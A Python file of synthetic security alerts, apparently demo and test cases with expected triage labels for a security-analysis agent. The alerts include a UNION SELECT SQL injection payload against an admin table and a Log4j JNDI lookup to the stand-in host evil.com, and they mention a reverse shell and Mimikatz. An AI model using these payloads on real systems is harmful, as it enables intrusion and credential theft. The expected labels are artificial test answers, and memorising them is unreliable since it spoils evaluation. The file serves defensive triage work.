"""Built-in demo cases for SecAgentX MVP."""
from typing import Any, Dict, List, Optional

DemoCase = Dict[str, Any]

DEMO_CASES: List[DemoCase] = [
    {
        "id": "case_ssh_bruteforce",
        "title": "SSH 暴力破解后疑似入侵",
        "severity": "high",
        "raw_content": """[Alert] SSH Brute Force Detected
Source: 192.168.1.105
Target: 10.0.0.12 (jump-server-01)
Time: 2026-06-01T03:15:00Z
Details: 超过 500 次登录失败，随后出现一次成功登录，并执行了 /tmp/.config/update 脚本。用户名为 root。目标主机为运维跳板机。""",
        "expected": {
            "event_type": "暴力破解 / 入侵",
            "risk_level": "high",
            "attack_stage": "Initial Access -> Execution",
        },
    },
    {
        "id": "case_sql_injection",
        "title": "Web SQL 注入攻击告警",
        "severity": "critical",
        "raw_content": """[WAF Alert] SQL Injection Attempt
Source: 203.0.113.44
Target: web-api-prod (10.0.2.8:8080)
Time: 2026-06-02T14:22:11Z
Rule: SQLi-Union-Select
Payload: id=1 UNION SELECT username,password FROM admin--
User-Agent: sqlmap/1.7
Impact: 200 OK returned with 12 rows of data""",
        "expected": {
            "event_type": "Web 攻击 / 数据泄露",
            "risk_level": "critical",
            "attack_stage": "Initial Access -> Collection",
        },
    },
    {
        "id": "case_log4j_exploit",
        "title": "Log4j 类高危漏洞影响研判",
        "severity": "critical",
        "raw_content": """[Vuln Alert] Log4j RCE Exploitation Attempt
Source: 198.51.100.77
Target: app-server-03 (10.0.3.15:8080)
Time: 2026-06-03T09:05:33Z
JNDI Lookup: ${jndi:ldap://evil.com/a}
Service: Java App / Spring Boot 2.4
Detection: DNS outbound query to evil.com observed
Follow-up: Reverse shell connection to 198.51.100.77:4444""",
        "expected": {
            "event_type": "漏洞利用 / RCE",
            "risk_level": "critical",
            "attack_stage": "Initial Access -> Execution -> C2",
        },
    },
    {
        "id": "case_abnormal_process",
        "title": "主机异常进程与外联行为",
        "severity": "medium",
        "raw_content": """[EDR Alert] Abnormal Process Behavior
Host: db-server-02 (10.0.1.20)
Time: 2026-06-03T21:40:00Z
Process: /tmp/kworkerds (PID 8842)
Parent: systemd (PID 1) — suspicious
Network: TCP connection to 185.220.101.33:3333 sustained for 15 minutes
CPU: 95% sustained (cryptominer signature)
File writes: /etc/cron.d/update.sh""",
        "expected": {
            "event_type": "恶意软件 / 挖矿",
            "risk_level": "medium",
            "attack_stage": "Execution -> Persistence",
        },
    },
    {
        "id": "case_lateral_movement",
        "title": "可疑账号横向登录行为",
        "severity": "high",
        "raw_content": """[SIEM Alert] Lateral Movement Detected
Source: 10.0.0.12 (jump-server-01)
Target: 10.0.1.20 (db-server-02), 10.0.2.8 (web-api-prod)
Time: 2026-06-04T01:10:00Z
Account: svc_backup (service account)
Method: PsExec / WMI
Authentication: NTLM
Anomaly: svc_backup 从未在 db-server-02 和 web-api-prod 上登录过
Follow-up: Mimikatz usage detected on jump-server-01""",
        "expected": {
            "event_type": "横向移动 / 凭证滥用",
            "risk_level": "high",
            "attack_stage": "Credential Access -> Lateral Movement",
        },
    },
]


def get_demo_case(case_id: str) -> Optional[DemoCase]:
    for case in DEMO_CASES:
        if case["id"] == case_id:
            return case
    return None
